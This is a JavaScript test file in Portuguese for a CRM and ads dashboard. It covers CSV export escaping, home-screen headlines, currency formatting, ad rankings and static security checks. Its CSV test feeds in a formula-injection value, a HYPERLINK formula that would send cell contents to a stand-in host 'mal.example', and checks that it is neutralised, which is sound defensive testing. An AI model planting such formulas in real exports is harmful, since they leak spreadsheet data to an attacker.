    ["+551299", 1, 0], ["-2+3", 2, -1.25], ["@SUM(A1)", 0, null], ["\tAna", 1, 1], ["Ana", 1, 1],
  ]);
  const linhas = s.slice(1).split("\r\n");
  assert.equal(linhas[1], `"'=HYPERLINK(""http://mal.example/?""&A1;""clique"")";3;12,5`);
  assert.equal(linhas[2], "'+551299;1;0");
  assert.equal(linhas[3], "'-2+3;2;-1,25", "texto com - vira texto; número negativo sai como número");
  assert.equal(linhas[4], "'@SUM(A1);0;");
  assert.equal(linhas[5], "'\tAna;1;1");
  assert.equal(linhas[6], "Ana;1;1");
  for (const l of linhas.slice(1)) assert.ok(!/^[=+\-@\t\r]/.test(l), `nenhuma célula começa com fórmula: ${l}`);
});

const INI = {
  conversas: { abertas: 0, aguardando: 0, sem_dono: 0, minhas: 0, pendentes: 0, espera_mais_antiga_min: null },
  tarefas: { hoje: 0, atrasadas: 0, proximas: [] },
  negocios: { abertos: 0, valor_aberto: 0, previsao_ponderada: 0, ganhos_mes: 0, receita_mes: 0, receita_mes_anterior: 0 },
  leads: { hoje: 0, hoje_anuncio: 0, semana: 0 }, canais: [], notificacoes_nao_lidas: 0,
};
await teste("Início: 'Tudo pronto para começar' só para cliente realmente novo", () => {
  assert.equal(L.inicioVazio(INI), true);
  assert.equal(L.inicioVazio({ ...INI, canais: [{ id: "k", status: "pendente" }] }), false, "já tem número");
  assert.equal(L.inicioVazio({ ...INI, negocios: { ...INI.negocios, abertos: 1 } }), false);
  assert.equal(L.inicioVazio({ ...INI, conversas: { ...INI.conversas, abertas: 2 } }), false);
  assert.equal(L.inicioVazio({ ...INI, leads: { ...INI.leads, semana: 1 } }), false);
  assert.equal(L.inicioVazio(null), false, "sem resposta não mostra o 'comece aqui'");
});

await teste("Início: saudação pelo relógio de SP, saúde do número e mês contra o mesmo pedaço do mês anterior", () => {
  assert.equal(L.saudacao(new Date("2026-09-28T11:00:00Z")), "Bom dia", "08:00 em SP");
  assert.equal(L.saudacao(new Date("2026-09-28T17:00:00Z")), "Boa tarde", "14:00 em SP");
  assert.equal(L.saudacao(new Date("2026-09-29T01:30:00Z")), "Boa noite", "22:30 em SP");
  const agora = Date.parse("2026-09-28T12:00:00Z");
  assert.deepEqual(L.estadoCanal({ status: "erro" }, agora), { nivel: "ruim", texto: "Com erro" });
  assert.equal(L.estadoCanal({ status: "pendente", app_inscrito: false }, agora).texto, "App não inscrito na WABA");
  assert.equal(L.estadoCanal({ status: "pendente", app_inscrito: null }, agora).nivel, "aten");
  assert.equal(L.estadoCanal({ status: "ativo", ultima_entrada_em: "2026-09-28T10:00:00Z" }, agora).nivel, "bom");
  assert.match(L.estadoCanal({ status: "ativo", ultima_entrada_em: "2026-09-24T10:00:00Z" }, agora).texto, /mais de 3 dias/);
  assert.equal(L.estadoCanal({ status: "ativo", ultima_entrada_em: null }, agora).nivel, "bom", "número novo, ainda sem mensagem, não é problema");
  const mv = L.mesVsAnterior({ receita_mes: 5000, receita_mes_anterior: 12000, receita_mes_anterior_parcial: 4000, dia_do_mes: 28 });
  assert.deepEqual(mv, { atual: 5000, anterior: 4000, anteriorInteiro: 12000, dia: 28 });
  assert.equal(L.chipVar(mv.atual, mv.anterior, "cima").txt, "25%");
  assert.equal(L.mesVsAnterior({ receita_mes: 10, receita_mes_anterior: 7 }).anterior, 7, "sem o parcial usa o mês inteiro (contrato básico)");
  assert.equal(L.mesVsAnterior(null), null);
});

await teste("ranking de criativos: CRM por criativo soma o crmTot do núcleo; ordem, filtros e barra", () => {
  for (const [dias, plat] of [[7, ""], [30, ""], [60, ""], [30, "meta"], [30, "google"]]) {
    const { de, ate } = L.janela(MD, dias);
    const soma = { conversas: 0, agendadas: 0, compareceram: 0, fecharam: 0, receita: 0 };
    for (const c of L.crmPorCriativo(MD, de, ate, { plat }).values()) for (const k of Object.keys(soma)) soma[k] += c[k];
    const t = MD.crmTot(de, ate, { plat });
    const semCri = MD.LEADS.filter(x => x.plat && !x.cri).length;
    assert.equal(semCri, 0, "no demo todo lead de anúncio tem criativo");
    for (const k of Object.keys(soma)) assert.ok(Math.abs(soma[k] - t[k]) < 1e-6, `${dias}d ${plat || "tudo"}: ${k} ${soma[k]} ≠ ${t[k]}`);
  }
  const r = L.rankingCriativos(MD, { dias: 30, por: "receita" });
  assert.equal(r.por, "receita"); assert.ok(r.lista.length > 0 && r.lista.length <= 8);
  assert.ok(r.lista.every((x, i, a) => x.pos === i + 1 && x.c.receita > 0 && (i === 0 || a[i - 1].c.receita >= x.c.receita)), "receita em ordem, sem zeros");
  assert.equal(r.lista[0].barra, 1); assert.ok(r.lista.every(x => x.barra >= 0 && x.barra <= 1));
  const f = L.rankingCriativos(MD, { dias: 30, por: "fechados" });
  assert.ok(f.lista.every((x, i, a) => x.c.fecharam > 0 && (i === 0 || a[i - 1].c.fecharam >= x.c.fecharam)));
  const c = L.rankingCriativos(MD, { dias: 30, por: "cpa" });
  assert.ok(c.lista.every((x, i, a) => x.t.conversoes >= L.MIN_CONV_CPA && (i === 0 || a[i - 1].t.cpa <= x.t.cpa)), "menor custo primeiro, com volume mínimo");
  assert.equal(c.lista[0].barra, 1, "o menor custo enche a barra");
  assert.ok(c.lista.every(x => !/:outros$/.test(x.k.id)), "'Outros anúncios da campanha' não é criativo");
  assert.equal(L.rankingCriativos(MD, { por: "inventado" }).por, "receita");
  const top = r.lista[0], k = top.k;
  const campT = L.criativosDaCampanha(MD, k.camp, { dias: 30 }).find(x => x.k.id === k.id);
  assert.ok(Math.abs(campT.t.gasto - top.t.gasto) < 1e-9, "investimento do criativo = o da gaveta de criativos");
  const vazio = L.rankingCriativos(mDeDados({ hoje: HOJE, cliente: { nome: "Nova", cfg: {} }, metricas: [], leads: [] }), { dias: 30 });
  assert.deepEqual([vazio.total, vazio.lista.length], [0, 0], "cliente sem anúncios: ranking vazio, sem erro");
});

await teste("Configurações: seções 'anuncios' (gestor, módulo ads) e 'formulario' (admin, módulo crm) com os ids fixos do §7.2", async () => {
  const A = await import("../web/app/ads-config.js");
  const ids = A.secoesConfig.map(s => [s.id, s.papelMin, s.modulo, s.grupo]);
  assert.deepEqual(ids, [["anuncios", "gestor", "ads", "Anúncios"], ["formulario", "admin", "crm", "Anúncios"]]);
  assert.ok(A.secoesConfig.every(s => typeof s.montar === "function" && s.titulo));
});

await teste("formulário do site: código de exemplo manda p_chave/p_dados certos, é JS válido e não usa innerHTML", async () => {
  const A = await import("../web/app/ads-config.js");
  const url = "https://x.supabase.co/rest/v1/rpc/nx_lead_entrada", chave = "ab".repeat(24);
  const cod = A.codigoExemplo({ url, apikey: "sb_publishable_abc", chave });
  assert.ok(cod.includes(`fetch("${url}"`) && cod.includes('apikey: "sb_publishable_abc"') && cod.includes(`p_chave: "${chave}"`));
  for (const campo of ["nome", "telefone", "email", "mensagem", "servico", "utm_source", "utm_campaign"]) assert.ok(cod.includes(`${campo}:`), `campo ${campo}`);
  for (const nome of ["nome", "telefone", "email", "mensagem"]) assert.ok(cod.includes(`name="${nome}"`), `input ${nome}`);
  assert.ok(!/innerHTML|Authorization|Bearer/.test(cod), "sem innerHTML e sem mandar a chave como JWT");
  const js = cod.slice(cod.indexOf("<script>") + 8, cod.indexOf("</script>"));
  assert.doesNotThrow(() => new Function(js), "o <script> do exemplo compila");
});

await teste("CodeWords: instruções usam a entrada por cliente e avisam que não sincronizam a caixa de conversas", async () => {
  const A = await import("../web/app/ads-config.js");
  const url = "https://x.supabase.co/rest/v1/rpc/nx_lead_entrada", chave = "cd".repeat(24);
  const texto = A.instrucoesCodeWords({ url, apikey: "sb_publishable_teste", chave });
  assert.ok(texto.includes(`URL: ${url}`));
  assert.ok(texto.includes(`"p_chave": "${chave}"`));
  assert.ok(texto.includes("apikey: sb_publishable_teste"));
  for (const campo of ["nome", "telefone", "email", "mensagem", "servico", "utm_source", "utm_campaign"]) {
    assert.ok(texto.includes(`"${campo}"`), `campo ${campo}`);
  }
  assert.match(texto, /não envie em cada mensagem/i);
  assert.match(texto, /sincroniza mensagens na caixa Conversas/i);
  assert.match(texto, /origem ‘Site’/);
  assert.doesNotMatch(texto, /Authorization|Bearer/);
});

await teste("Ajustes de anúncios: valor em reais do jeito brasileiro ('2.000' é dois mil, nunca R$ 2)", async () => {
  const A = await import("../web/app/ads-config.js");
  const casos = [["2.000", 2000], ["1.500,00", 1500], ["R$ 1.234.567,89", 1234567.89], ["15,5", 15.5], ["15.5", 15.5], ["997", 997],
    ["0", 0], ["", null], ["  ", null], ["abc", null], ["R$ 1.500", 1500], [null, null], [undefined, null], ["12.34", 12.34]];
  for (const [s, esperado] of casos) assert.equal(A.lerReais(s), esperado, `lerReais(${JSON.stringify(s)})`);
  // o formulário de metas e os tickets leem pelo lerReais (não pelo lerMoeda do ui.js, que dá 2 para "2.000")
  const src = ler("web/app/ads-config.js");
  assert.ok(!/lerMoeda\(/.test(src), "ads-config não chama ui.lerMoeda");
  assert.ok(/reais\("orcamento"\)/.test(src) && /reais\("fee"\)/.test(src) && /reais\("cpaAlvo"\)/.test(src));
});

/* ============================================================
   (e) CHECAGEM ESTÁTICA DOS ARQUIVOS DA F6
   ============================================================ */
console.log("\n(e) estática");
const ARQ_JS = ["inicio.js", "anuncios.js", "relatorios.js", "graficos.js", "ads-config.js", "rel-logica.js"].filter(f => existsSync(join(WEB, "app", f)));
const ARQ_CSS = ["relatorios.css"].filter(f => existsSync(join(WEB, "app", f)));

await teste("todos os .js da F6 passam em node --check", () => {
  for (const f of ARQ_JS) execFileSync(process.execPath, ["--check", join(WEB, "app", f)]);
  assert.ok(ARQ_JS.includes("anuncios.js") && ARQ_JS.includes("rel-logica.js") && ARQ_JS.includes("graficos.js"));
});

await teste("sem import estático; todo import() com ?v=; rel-logica sem import nenhum; módulos não carregam ui/api/app/tema", () => {
  for (const f of ARQ_JS) {
    const src = ler(`web/app/${f}`);
    assert.ok(!/^\s*import\s[^(]/m.test(src), `${f}: import estático`);
    for (const m of src.matchAll(/import\(([^)]*)\)/g)) assert.match(m[1], /\?v=\$\{/, `${f}: import( sem ?v=`);
    assert.ok(!/import\(`\.\/(ui|api|app|tema)\.js/.test(src), `${f}: carrega arquivo do shell`);
  }
  assert.ok(!/import\s*\(/.test(ler("web/app/rel-logica.js")), "rel-logica.js é puro");
});

await teste("segurança e tokens: sem innerHTML, sem on*= inline, sem hex de cor nos .js e nos .css (fora de :root)", () => {
  for (const f of ARQ_JS) {
    const src = ler(`web/app/${f}`);
    assert.ok(!/\.innerHTML\s*=|insertAdjacentHTML|outerHTML\s*=/.test(src), `${f}: innerHTML`);
    assert.ok(!/#[0-9a-fA-F]{6}\b|#[0-9a-fA-F]{3}\b(?![\w-])/.test(src.replace(/\/\^#\[0-9a-f\]\{6\}\$\/i/g, "").replace(/"#\/[^"]*"|`#\/[^`]*`|href: "#[^"]*"/g, "")), `${f}: cor em hex`);
    assert.ok(!/\son[a-z]+\s*=\s*["']/.test(src), `${f}: on*= inline`);
  }
  for (const f of ARQ_CSS) {
    const css = ler(`web/app/${f}`).replace(/\/\*[\s\S]*?\*\//g, "");
    const semRoot = css.replace(/:root[^{]*\{[^}]*\}/g, "");
    assert.ok(!/#[0-9a-fA-F]{3,8}\b/.test(semRoot), `${f}: hex fora de :root`);
    assert.ok(/\[hidden\]\s*\{\s*display:\s*none\s*!important;?\s*\}/.test(css), `${f}: [hidden] forte`);
    assert.ok(!/(?<![\d.])1fr\b/.test(css.replace(/minmax\(0,\s*1fr\)/g, "")), `${f}: 1fr solto`);
    assert.ok(!/cubic-bezier|\b\d+m?s\b(?![\w-])/.test(semRoot.replace(/var\(--[\w-]+\)/g, "")), `${f}: curva/duração fora de :root`);
    assert.ok(!/ease-in(?!-out)/.test(css), `${f}: ease-in`);
    assert.match(css, /prefers-reduced-motion/, `${f}: movimento reduzido`);
  }
});

/* ============================================================ M38 — números que cabem e moeda editorial */
console.log("\n(f) M38 — números que cabem e moeda editorial");

await teste("M38: partesMoeda/textoMoeda — arredonda, separa milhar, sinal de menos, vazio vira «—»", () => {
  assert.deepEqual(L.partesMoeda(28400, { centavos: false }), { neg: "", rs: "R$", inteiro: "28.400", cent: "" });
  assert.deepEqual(L.partesMoeda(3155.56, { centavos: false }), { neg: "", rs: "R$", inteiro: "3.156", cent: "" }, "sem centavos arredonda");
  assert.deepEqual(L.partesMoeda(3.4), { neg: "", rs: "R$", inteiro: "3", cent: ",40" }, "centavos por padrão");
  assert.deepEqual(L.partesMoeda(1234567.891), { neg: "", rs: "R$", inteiro: "1.234.567", cent: ",89" });
  assert.equal(L.partesMoeda(-1.5).neg, "−");
  assert.equal(L.partesMoeda(-0.001).neg, "", "−0 não aparece");
  assert.equal(L.partesMoeda(null), null);
  assert.equal(L.partesMoeda(""), null);
  assert.equal(L.partesMoeda("abc"), null);
  assert.equal(L.textoMoeda(28400, { centavos: false }), "R$ 28.400");
  assert.equal(L.textoMoeda(-1.5), "−R$ 1,50");
  assert.equal(L.textoMoeda(undefined), "—");
});

await teste("M38: preencherMoeda monta R$ e centavos em spans (60 % pelo CSS) só com nós de texto/elementos", () => {
  // DOM de mentira mínimo: o que o preencherMoeda usa (limpar, h, classList, append, textContent)
  const no = (tag, cls) => ({ tag, cls, filhos: [], append(...x) { this.filhos.push(...x); }, classList: { add() {} }, set textContent(v) { this.filhos = [String(v)]; } });
  const ui = { limpar: el => { el.filhos = []; }, h: (tag, a, ...f) => { const n = no(tag, a && a.class); n.append(...f); return n; } };
  const el = no("b");
  L.preencherMoeda(ui, el, 28400.5, { centavos: true });
  assert.deepEqual(el.filhos.map(x => (typeof x === "string" ? x : `${x.cls}:${x.filhos.join("")}`)), ["nm-rs:R$", "28.400", "nm-cent:,50"]);
  L.preencherMoeda(ui, el, 950, { centavos: false });
  assert.deepEqual(el.filhos.map(x => (typeof x === "string" ? x : `${x.cls}:${x.filhos.join("")}`)), ["nm-rs:R$", "950"]);
  L.preencherMoeda(ui, el, null);
  assert.deepEqual(el.filhos, ["—"]);
});

await teste("M38: CSS — o número encolhe pela largura do CARTÃO (container query), 6 KPIs só em uma linha quando cabem e nada de 6 colunas fixas", () => {
  const css = ler("web/app/relatorios.css").replace(/\/\*[\s\S]*?\*\//g, "");
  assert.match(css, /\.rel-corpo \{[^}]*container: relcorpo \/ inline-size/, "a área do relatório é container");
  assert.match(css, /\.rel-kpi \{[^}]*container-type: inline-size/, "o cartão de KPI é container");
  assert.match(css, /\.rel-kpi-v \{[^}]*font-size: clamp\(var\(--fs-h2\), 11cqi, var\(--fs-num-l\)\)/, "tamanho por cqi, só com tokens");
  assert.match(css, /@container relcorpo \(min-width: 62rem\) \{ \.rel-kpis-6 \{ grid-template-columns: repeat\(6, minmax\(0, 1fr\)\); \} \}/, "6 em uma linha só com 62 rem ou mais");
  assert.match(css, /@container relcorpo \(min-width: 31rem\) \{ \.rel-kpis-6 \{ grid-template-columns: repeat\(3, minmax\(0, 1fr\)\); \} \}/);
  assert.doesNotMatch(css, /\n\.rel-kpis-6 \{ grid-template-columns: repeat\(6/, "sem 6 colunas fixas fora da container query");
  assert.match(css, /\.ini-numero \{\s*container-type: inline-size;/, "o bloco de número do Início também é container");
  assert.match(css, /\.ini-n \{[^}]*font-size: clamp\(var\(--fs-h2\), 16cqi, var\(--fs-num-l\)\)/);
  assert.match(css, /\.rel-num \{[^}]*font-variant-numeric: tabular-nums/, "números tabulares");
  assert.match(css, /\.rel-tabela \.num \{ text-align: right; white-space: nowrap; \}/, "coluna numérica à direita");
});

await teste("M38: Início, Anúncios e Relatórios montam dinheiro com contarMoeda/preencherMoeda (nunca innerHTML)", () => {
  assert.match(ler("web/app/relatorios.js"), /k\.fmt === "brl0"\) L\.contarMoeda\(ui, G, b, vv, \{ centavos: false \}\)/);
  assert.match(ler("web/app/anuncios.js"), /fmt === N\.brl \|\| fmt === N\.brl0\) L\.contarMoeda\(ui, G, b, valor, \{ centavos: fmt === N\.brl \}\)/);
  const ini = ler("web/app/inicio.js");
  assert.match(ini, /fmt === brl0\) L\.preencherMoeda\(ui, b, valor, \{ centavos: false \}\)/, "valor final já na tela");
  assert.match(ini, /fmt === brl0 \? L\.contarMoeda\(ui, G, b, valor, \{ centavos: false \}\) : G\.contar\(b, valor, fmt\)/, "o contador começa depois de o esqueleto sair");
  assert.match(ini, /L\.preencherMoeda\(ui, h\("b", \{ class: "ini-barra-v rel-num" \}\), v, \{ centavos: false \}\)/);
});

await teste("M38 (navegador): nenhum número passa do cartão em 768, 1024, 1180, 1280 e 1440 px — roda com ORBITA_QA_NAVEGADOR=1 (puppeteer-core + Chrome; ORBITA_PUPPETEER aponta a pasta node_modules)", async () => {
  if (process.env.ORBITA_QA_NAVEGADOR !== "1") { console.log("      (pulado: defina ORBITA_QA_NAVEGADOR=1 para abrir o Chrome)"); return; }
  const { createRequire } = await import("node:module");
  const { spawn } = await import("node:child_process");
  const req = createRequire(join(process.env.ORBITA_PUPPETEER || RAIZ, "x.js"));
  const puppeteer = req("puppeteer-core");
  const chrome = process.env.ORBITA_CHROME || ["C:/Program Files/Google/Chrome/Application/chrome.exe", "/usr/bin/google-chrome", "/usr/bin/chromium"].find(existsSync);
  assert.ok(chrome, "Chrome não encontrado (ORBITA_CHROME)");
  const porta = 4900 + Math.floor(Math.random() * 90);
  const srv = spawn(process.execPath, [join(RAIZ, "scripts", "dev-falso.mjs")], { env: { ...process.env, ORBITA_DEV_FALSO_PORT: String(porta) }, stdio: "ignore", windowsHide: true });
  try {
    await new Promise(r => setTimeout(r, 1800));
    const browser = await puppeteer.launch({ executablePath: chrome, headless: "new", args: ["--no-sandbox", "--disable-gpu"] });
    const fora = [];
    try {
      for (const w of [768, 1024, 1180, 1280, 1440]) {
        const page = await browser.newPage();
        await page.setViewport({ width: w, height: 900 });
        await page.goto(`http://127.0.0.1:${porta}/app/?dev-falso=1&dev=1#/inicio`, { waitUntil: "domcontentloaded" });
        for (const rota of ["#/inicio", "#/relatorios/vendas", "#/relatorios/atendimento", "#/anuncios"]) {
          await page.evaluate(h => { location.hash = h; }, rota);
          await new Promise(r => setTimeout(r, 2400));
          const r = await page.evaluate(() => [...document.querySelectorAll(".rel-num, .rel-kpi-v, .ini-n")].filter(el => el.offsetParent).flatMap(el => {
            const caixa = el.closest(".rel-kpi, .ini-numero, .ads-passo, .ads-conta, .rel-cartao") || el.parentElement;
            const rg = document.createRange(); rg.selectNodeContents(el);
            const t = rg.getBoundingClientRect(), c = caixa.getBoundingClientRect();
            return t.right > c.right + 0.5 || (el.clientWidth > 0 && el.scrollWidth > el.clientWidth + 1) ? [(el.textContent || "").trim().slice(0, 20)] : [];
          }));
          for (const t of r) fora.push(`${w}px ${rota}: «${t}»`);
        }
        await page.close();
      }
    } finally { await browser.close(); }
    assert.deepEqual(fora, [], "número passando do cartão");
  } finally { srv.kill(); }
});

/* ============================================================ M31 — Início que diz o que importa agora */
console.log("\n(g) M31 — manchete do Início");

const LINKS = { conversas: "#/conversas?aba=aguardando", tarefas: "#/tarefas?aba=atrasadas", agenda: "#/agenda", crm: "#/crm" };
const VOC = { contato: "paciente", contatos: "pacientes", negocio: "oportunidade", negocios: "oportunidades", feminino: true };
const base = (o = {}) => ({ hoje: "2026-10-01",
  conversas: { aguardando: 0, sem_dono: 0, minhas: 0, abertas: 0, espera_mais_antiga_min: null },
  tarefas: { hoje: 0, atrasadas: 0, abertas: 0 }, negocios: { abertos: 0, valor_aberto: 0, ganhos_mes: 0 }, leads: { hoje: 0, semana: 0 }, canais: [{ nome: "n", status: "ativo", ultima_entrada_em: new Date().toISOString() }], ...o });
const agendaCom = n => ({ consultas: Array.from({ length: n }, (_, i) => ({ negocio_id: i, inicio: `2026-10-01T${String(9 + i).padStart(2, "0")}:00:00-03:00`, status: "aberto" })) });

await teste("M31: manchete — a frase do exemplo (muitos, singular/plural, com agenda e dinheiro em aberto)", () => {
  const d = base({ conversas: { aguardando: 2, espera_mais_antiga_min: 15 }, negocios: { abertos: 3, valor_aberto: 5200 } });
  const m = L.manchete(d, { agenda: agendaCom(1), voc: { ...VOC, contato: "cliente", contatos: "clientes", negocio: "orçamento", negocios: "orçamentos", feminino: false }, links: LINKS });
  assert.equal(m.texto, "2 clientes esperam resposta há 15 min. Hoje tem 1 consulta e R$ 5.200 em orçamentos abertos.");
  assert.equal(m.pendencia, true); assert.equal(m.urgente, true); assert.equal(m.contexto, true);
  // singular: 1 cliente espera; 1 consulta; 1 oportunidade aberta
  const s = L.manchete(base({ conversas: { aguardando: 1, espera_mais_antiga_min: 3 }, negocios: { abertos: 1, valor_aberto: 950 } }), { agenda: agendaCom(1), voc: VOC, links: LINKS });
  assert.equal(s.texto, "1 paciente espera resposta há 3 min. Hoje tem 1 consulta e R$ 950 em oportunidade aberta.");
  // plural de consulta e feminino
  const p = L.manchete(base({ negocios: { abertos: 4, valor_aberto: 12950 } }), { agenda: agendaCom(3), voc: VOC, links: LINKS });
  assert.match(p.texto, /Hoje tem 3 consultas e R\$ 12\.950 em oportunidades abertas\./);
});

await teste("M31: manchete — zero (tudo em dia), só tarefas atrasadas, as duas urgências juntas e a espera de horas", () => {
  const zero = L.manchete(base(), { agenda: null, voc: VOC, links: LINKS });
  assert.equal(zero.texto, "Tudo em dia."); assert.equal(zero.pendencia, false); assert.equal(zero.urgente, false);
  // sem pendência mas com contexto: a manchete só fala do dia e o selo "Tudo em dia." aparece embaixo
  const dia = L.manchete(base({ negocios: { abertos: 2, valor_aberto: 3000 } }), { agenda: agendaCom(2), voc: VOC, links: LINKS });
  assert.equal(dia.texto, "Hoje tem 2 consultas e R$ 3.000 em oportunidades abertas."); assert.equal(dia.pendencia, false);
  const so = L.manchete(base({ tarefas: { hoje: 1, atrasadas: 3 } }), { voc: VOC, links: LINKS });
  assert.equal(so.texto, "3 tarefas atrasadas."); assert.equal(so.pendencia, true);
  assert.equal(L.manchete(base({ tarefas: { atrasadas: 1 } }), { voc: VOC, links: LINKS }).texto, "1 tarefa atrasada.");
  const duas = L.manchete(base({ conversas: { aguardando: 1, espera_mais_antiga_min: 120 }, tarefas: { atrasadas: 2 } }), { voc: VOC, links: LINKS });
  assert.equal(duas.texto, "1 paciente espera resposta há 2 h e 2 tarefas atrasadas.");
  // tarefa para hoje ou conversa sem dono é pendência (o selo "tudo em dia" não aparece), mas não entra na frase
  assert.equal(L.manchete(base({ tarefas: { hoje: 2 } }), { voc: VOC }).pendencia, true);
  assert.equal(L.manchete(base({ conversas: { sem_dono: 1 } }), { voc: VOC }).pendencia, true);
  assert.equal(L.manchete(null, {}).texto, "Tudo em dia.", "sem dado nenhum não quebra");
});

await teste("M31: manchete — sem dado de agenda a frase não fala de consulta; dinheiro só com negócio aberto", () => {
  const d = base({ negocios: { abertos: 2, valor_aberto: 4000 } });
  assert.equal(L.manchete(d, { agenda: null, voc: VOC }).texto, "R$ 4.000 em oportunidades abertas.", "sem agenda: só o dinheiro");
  assert.equal(L.manchete(d, { agenda: { consultas: [] }, voc: VOC }).texto, "R$ 4.000 em oportunidades abertas.", "agenda vazia: nada de «0 consultas»");
  assert.equal(L.manchete(base({ negocios: { abertos: 0, valor_aberto: 0 } }), { agenda: agendaCom(1), voc: VOC }).texto, "Hoje tem 1 consulta.");
  assert.equal(L.manchete(base({ negocios: { abertos: 2, valor_aberto: 0 } }), { voc: VOC }).texto, "Tudo em dia.", "valor zerado não vira «R$ 0»");
  // consulta cancelada ou de outro dia não conta
  const ag = { consultas: [{ inicio: "2026-10-01T10:00:00-03:00", status: "cancelada" }, { inicio: "2026-10-02T10:00:00-03:00", status: "aberto" }, { inicio: "2026-10-01T15:00:00-03:00", status: "aberto" }] };
  assert.equal(L.consultasHoje(ag, "2026-10-01"), 1);
  assert.equal(L.consultasHoje(null, "2026-10-01"), null);
  assert.equal(L.consultasHoje({}, "2026-10-01"), null);
});

await teste("M31: manchete — cada trecho é link (conversas, tarefas, agenda, CRM) e sem permissão vira texto; o verbo vai em .narr e o número no acento", () => {
  const d = base({ conversas: { aguardando: 2, espera_mais_antiga_min: 15 }, tarefas: { atrasadas: 1 }, negocios: { abertos: 1, valor_aberto: 900 } });
  const m = L.manchete(d, { agenda: agendaCom(1), voc: VOC, links: LINKS });
  const nos = m.frases.flat().filter(n => n.t === "link");
  assert.deepEqual(nos.map(n => n.href), [LINKS.conversas, LINKS.tarefas, LINKS.agenda, LINKS.crm]);
  assert.equal(nos[0].partes.find(p => p.t === "narr").v, "pacientes esperam resposta", "o verbo de ação é a voz narrativa");
  assert.equal(nos[0].partes.find(p => p.t === "n").v, "2");
  assert.equal(nos[1].tom, "ruim", "tarefa atrasada no tom de erro");
  assert.deepEqual(nos[3].partes, [{ t: "moeda", v: 900 }]);
  const sem = L.manchete(d, { agenda: agendaCom(1), voc: VOC, links: { conversas: null, tarefas: null, agenda: null, crm: null } });
  assert.deepEqual(sem.frases.flat().filter(n => n.t === "link").map(n => n.href), [null, null, null, null], "sem permissão: sem href");
  assert.equal(sem.texto, m.texto, "o texto é o mesmo com ou sem link");
});

await teste("M31: blocosInicio — atendimento, tarefas e número com problema abertos nessa ordem; leads sempre recolhido; sem ação, só vendas aberto", () => {
  const ocupado = L.blocosInicio(base({ conversas: { aguardando: 1 }, tarefas: { atrasadas: 1 }, negocios: { abertos: 2 }, canais: [{ nome: "n", status: "erro" }] }));
  assert.deepEqual(ocupado.abertos, ["atendimento", "tarefas", "numeros", "vendas"]);
  assert.deepEqual(ocupado.recolhidos, ["leads"]);
  const calmo = L.blocosInicio(base({ negocios: { abertos: 2 } }));
  assert.deepEqual(calmo.abertos, ["vendas"]);
  assert.deepEqual(calmo.recolhidos.sort(), ["atendimento", "leads", "numeros", "tarefas"]);
  assert.ok(L.blocosInicio(base({ canais: [] })).abertos.includes("numeros"), "sem número conectado é ação");
  assert.ok(L.blocosInicio(base({ conversas: { sem_dono: 2 } })).abertos.includes("atendimento"), "conversa sem dono pede ação");
  assert.ok(!L.blocosInicio(base()).abertos.includes("vendas"), "sem nada em vendas, vendas também recolhe");
});

await teste("M31: numerosMudaram aponta só o que mudou (para G.destacar); campo ausente não conta", () => {
  const a = base({ conversas: { aguardando: 2, abertas: 3 }, negocios: { abertos: 3, valor_aberto: 5000 } });
  const b = base({ conversas: { aguardando: 3, abertas: 3 }, negocios: { abertos: 3, valor_aberto: 5200 } });
  assert.deepEqual(L.numerosMudaram(a, b).sort(), ["conversas.aguardando", "negocios.valor_aberto"]);
  assert.deepEqual(L.numerosMudaram(a, a), []);
  assert.deepEqual(L.numerosMudaram(null, b), []);
  assert.deepEqual(L.numerosMudaram({ conversas: {} }, { conversas: { aguardando: 4 } }), [], "sem valor antigo não pisca");
});

await teste("M31: inicio.js — esqueleto até chegar o dado, manchete por ui.cabecalho, cartões só com ação, «Mais detalhes» recolhido, G.destacar e agenda opcional", () => {
  const s = ler("web/app/inicio.js");
  assert.match(s, /raiz\.append\(ui\.esqueleto\("inicio"\)\)/, "esqueleto na entrada");
  assert.match(s, /ui\.trocarEsqueleto\(raiz, \[cab, corpo\]\)/, "o esqueleto só sai quando há dado");
  assert.match(s, /ui\.cabecalho\(\{ rotulo:/, "cabeçalho pelo componente do contrato");
  assert.match(s, /L\.manchete\(d, \{ agenda, links/);
  assert.match(s, /L\.blocosInicio\(d\)/);
  assert.match(s, /h\("details", \{ class: "ini-mais"/, "o que não pede ação fica recolhido");
  assert.match(s, /ui\.vazio\(\{ tipo: "em_dia", titulo: "Tudo em dia\."/);
  assert.match(s, /G\.destacar\(el\)/, "número que mudou acende");
  assert.match(s, /"nx_inicio", \{\}, \{ cache: true, aoCache \}/, "último dado pelo cache do shell");
  assert.match(s, /nx_agenda_dia[\s\S]{0,120}catch \{ return null; \}/, "a agenda é complemento: se falhar a frase só não fala de consulta");
  assert.doesNotMatch(s, /innerHTML/);
});

/* ============================================================ M32 — checklist "Deixe o Órbita pronto" */
console.log("\n(h) M32 — checklist de configuração");

const ESTADO_NOVO = () => ({ total: 11, feitos: 0, itens: L.ONBOARDING_ITENS.map(i => ({ id: i.id, rotulo: i.rotulo, feito: false, opcional: !!i.opcional })) });
const ESTADO_FEITOS = ids => { const e = ESTADO_NOVO(); for (const i of e.itens) if (ids.includes(i.id)) i.feito = true; return e; };
const TODOS_OBRIG = L.ONBOARDING_ITENS.filter(i => !i.opcional).map(i => i.id);

await teste("M32: os 11 itens na ordem recomendada e o mapeamento item → rota (1-5 abrem o assistente do número; os demais, a seção exata)", () => {
  assert.deepEqual(L.ONBOARDING_ITENS.map(i => i.id), ["chave_codewords", "aparelho_pareado", "recebimento", "ia_ou_direto", "mensagem_teste",
    "departamento_horario", "agenda_faixas", "script_site", "colega_convidado", "funil_ajustado", "anuncios_ligados"]);
  for (const id of ["chave_codewords", "aparelho_pareado", "recebimento", "ia_ou_direto", "mensagem_teste"])
    assert.equal(L.rotaOnboarding({ id }), "#/config/numeros?assistente=novo", `${id}: sem canal apontado → assistente de um número novo/pendente`);
  assert.equal(L.rotaOnboarding({ id: "recebimento", canal_id: "abc-123" }), "#/config/numeros?assistente=abc-123", "o servidor aponta o número que pede ação");
  assert.equal(L.rotaOnboarding({ id: "departamento_horario" }), "#/config/departamentos");
  assert.equal(L.rotaOnboarding({ id: "agenda_faixas" }), "#/config/agenda");
  assert.equal(L.rotaOnboarding({ id: "script_site" }), "#/config/rastreio");
  assert.equal(L.rotaOnboarding({ id: "colega_convidado" }), "#/config/usuarios");
  assert.equal(L.rotaOnboarding({ id: "funil_ajustado" }), "#/config/funis");
  assert.equal(L.rotaOnboarding({ id: "anuncios_ligados" }), "#/config/anuncios");
  assert.equal(L.rotaOnboarding({ id: "inexistente" }), "#/config");
  // toda rota aponta uma seção que existe nas Configurações (a lista pronta do prontos.js)
